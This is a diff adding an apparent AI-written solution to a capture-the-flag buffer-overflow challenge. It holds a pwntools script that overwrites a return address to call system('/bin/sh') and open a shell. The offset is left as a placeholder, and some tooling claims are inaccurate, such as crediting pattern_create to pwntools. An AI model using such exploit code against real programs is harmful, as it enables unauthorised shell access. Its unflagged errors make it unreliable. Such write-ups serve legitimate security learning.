@@ -1,0 +1,61 @@
+To solve this challenge using `pwntools`, we need to exploit the buffer overflow vulnerability in the `vulnerable_function` to achieve arbitrary code execution. The goal is to call the `not_called` function, which executes `system("/bin/date")`. However, we can also directly call `system("/bin/sh")` to get a shell.
+
+Here are the steps and code to solve the challenge:
+
+### Steps:
+1. **Identify the Buffer Overflow**: The `vulnerable_function` reads up to 0x100 bytes into a buffer of size 136, causing a buffer overflow.
+2. **Find the Return Address**: Determine the offset where the return address is overwritten.
+3. **Find the Address of `system` and `/bin/sh`**: Use the `.rel.plt` section to find the addresses of `system` and the string `/bin/sh`.
+4. **Construct the Payload**: Create a payload that overwrites the return address with the address of `system` and provides the necessary arguments.
+
+### Code:
+```python
+from pwn import *
+
+# Set up the process
+context.binary = elf = ELF('rop')
+p = process(elf.path)
+
+# Find the offset to the return address
+offset = cyclic_find(0x61616161)  # Replace with the actual offset found using cyclic pattern
+
+# Addresses
+system_addr = elf.plt['system']
+bin_sh_addr = next(elf.search(b'/bin/sh'))
+exit_addr = elf.plt['exit']  # To prevent the program from crashing after executing system
+
+# Construct the payload
+payload = b'A' * offset
+payload += p32(system_addr)
+payload += p32(exit_addr)  # Return address after system
+payload += p32(bin_sh_addr)
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+### Explanation:
+1. **Set up the process**: We use `pwntools` to load the binary and start the process.
+2. **Find the offset**: Use `cyclic` and `cyclic_find` to determine the exact offset where the return address is overwritten. You can generate a cyclic pattern and send it to the program to identify the offset.
+3. **Addresses**:
+   - `system_addr`: Address of the `system` function in the PLT.
+   - `bin_sh_addr`: Address of the string `/bin/sh` in the binary.
+   - `exit_addr`: Address of the `exit` function to prevent the program from crashing after `system` is called.
+4. **Construct the payload**: The payload consists of:
+   - `A` * offset: Filler to reach the return address.
+   - `p32(system_addr)`: Overwrite the return address with the address of `system`.
+   - `p32(exit_addr)`: Address to return to after `system` is called.
+   - `p32(bin_sh_addr)`: Argument to `system`, which is the address of the string `/bin/sh`.
+
+5. **Send the payload**: Send the constructed payload to the process.
+6. **Interact with the shell**: Use `p.interactive()` to interact with the shell spawned by `system`.
+
+### Notes:
+- Ensure you have the correct offset. You can use `pattern_create` and `pattern_offset` from `pwntools` to find the exact offset.
+- The addresses may vary depending on the environment, so you might need to adjust them accordingly.
+- If the binary is running on a remote server, you can replace `process(elf.path)` with `remote('host', port)`.
+
+This should give you a working solution to the challenge.
